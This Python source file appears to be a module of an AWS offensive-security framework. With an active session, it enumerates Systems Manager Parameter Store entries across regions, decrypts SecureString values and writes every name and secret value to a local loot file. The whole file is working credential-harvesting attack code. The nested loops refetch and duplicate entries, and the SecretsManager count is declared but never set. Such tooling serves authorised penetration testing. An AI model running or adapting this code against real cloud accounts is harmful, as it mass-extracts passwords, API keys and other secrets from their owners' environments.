#!/usr/bin/env python3
import datetime

import argparse
from botocore.exceptions import ClientError
import os

def main(args, awsattack_main):
    session = awsattack_main.get_active_session()
    print = awsattack_main.print
    get_regions = awsattack_main.get_regions

    summary_data = {"SecretsManager": 0,"ParameterStore": 0}

    if args.regions is None:
        regions = get_regions('secretsmanager')
        if regions is None or regions == [] or regions == '' or regions == {}:
            print('This module is not supported in any regions specified in the current sessions region set. Exiting...')
            return None
    else:
        regions = args.regions.split(',')

    all_secrets_ids_ssm = []

    if not os.path.exists('./sessions/{}/downloads/secrets/parameter_store'.format(session.name)):
        os.makedirs('./sessions/{}/downloads/secrets/parameter_store'.format(session.name))

    for region in regions:
        secrets_ssm = []

        client = awsattack_main.get_boto3_client('ssm', region)

        response = None
        while response is None:
            try:
                response = client.describe_parameters()
            except ClientError as error:
                code = error.response['Error']['Code']
                print('FAILURE: ')
                if code == 'UnauthorizedOperation':
                    print('  Access denied to DescribeParameters.')
                else:
                    print(' ' + code)
                print('    Could not list parameters... Exiting')
                return None
            
            for param in response["Parameters"]:
                secrets_ssm.append({"name":param["Name"],"type":param["Type"],"region":region})

            
        all_secrets_ids_ssm += secrets_ssm

    
        for param in all_secrets_ids_ssm:
            client = awsattack_main.get_boto3_client('ssm',param["region"])

            response = None
            while response is None:
                if param["type"] != "SecureString":
                    try:
                        response = client.get_parameter(
                            Name=param["name"]
                        )
                    except ClientError as error:
                        code = error.response['Error']['Code']
                        print('FAILURE: ')
                        if code == 'UnauthorizedOperation':
                            print('  Access denied to GetParameter.')
                        else:
                            print(' ' + code)
                        print('    Could not get parameter value... Exiting')
                        return None

                else:
                    try:
                        response = client.get_parameter(
                            Name=param["name"],
                            WithDecryption=True
                        )
                    except ClientError as error:
                        code = error.response['Error']['Code']
                        print('FAILURE: ')
                        if code == 'UnauthorizedOperation':
                            print('  Access denied to GetParameter.')
                        else:
                            print(' ' + code)
                        print('    Could not get parameter value... Exiting')
                        return None
                
                with open('./sessions/{}/downloads/secrets/parameter_store/parameters.txt'.format(session.name),'a') as f:
                    f.write("{}:{}\n".format(param["name"], response["Parameter"]["Value"]))

    summary_data["ParameterStore"] = len(all_secrets_ids_ssm)

    return summary_data

